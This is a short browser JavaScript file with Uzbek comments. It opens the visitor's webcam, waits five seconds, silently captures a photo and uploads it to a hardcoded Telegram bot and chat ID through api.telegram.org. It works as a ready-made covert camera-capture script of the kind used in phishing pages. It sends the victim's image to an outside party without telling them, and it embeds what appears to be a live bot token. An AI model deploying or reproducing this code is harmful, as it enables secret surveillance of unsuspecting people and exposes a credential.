// Telegram bot tokeni va chat ID
const BOT_TOKEN = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Bot tokenini shu yerga qo'ying
const CHAT_ID = '5934257995'; // Chat ID-ni shu yerga qo'ying

// Video elementini tanlang
const video = document.getElementById('video');

// MediaStream orqali video oqimini olish
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;

        // Video tayyor bo'lganda surat olishni kutish
        video.addEventListener('canplay', () => {
            // Surat olishni 5 soniya kutib amalga oshirish
            setTimeout(() => {
                takePicture();
            }, 5000); // 5 soniya kutish
        });
    })
    .catch(error => {
        console.error('Xato:', error);
    });

// Suratga olish funksiyasi
function takePicture() {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    // Video o'lchamlarini to'g'ri sozlash
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Video oqimini canvasga chizish
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Rasmni base64 formatda olish
    const imageData = canvas.toDataURL('image/png');
    sendPhotoToTelegram(imageData);
}

// Telegram bot orqali surat yuborish
function sendPhotoToTelegram(imageData) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

    // Base64 formatdagi suratni blobga aylantirish
    const blob = dataURLtoBlob(imageData);

    // FormData obyekti yaratish
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.png');

    // Suratni yuborish
    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Surat yuborildi!');
        } else {
            console.error('Telegram API xatosi:', data);
        }
    })
    .catch(error => {
        console.error('Xato:', error);
    });
}

// Base64 formatdagi suratni blobga aylantirish
function dataURLtoBlob(dataURL) {
    const [header, data] = dataURL.split(',');
    const mime = header.match(/:(.*?);/)[1];
    const binary = atob(data);
    const array = [];
    for (let i = 0; i < binary.length; i++) {
        array.push(binary.charCodeAt(i));
    }
    return new Blob([new Uint8Array(array)], { type: mime });
}

